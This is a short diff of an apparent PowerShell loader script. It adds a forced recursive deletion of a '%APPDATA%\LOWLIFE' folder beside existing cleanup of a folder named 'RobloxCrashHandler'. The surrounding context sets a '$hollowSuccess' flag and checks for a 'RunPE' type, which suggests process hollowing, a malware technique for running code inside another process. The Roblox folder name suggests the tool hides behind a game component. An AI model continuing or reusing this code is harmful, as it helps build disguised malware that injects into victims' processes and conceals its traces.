@@ -491,6 +491,8 @@ Log-Msg "Section 1 complete."
     # Remove old file-based install folder if it exists (legacy cleanup)
     $oldFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
     if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
+    $oldAppData = "$env:APPDATA\LOWLIFE"
+    if (Test-Path $oldAppData) { Remove-Item $oldAppData -Recurse -Force -ErrorAction SilentlyContinue }
 
     $hollowSuccess = $false
     if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
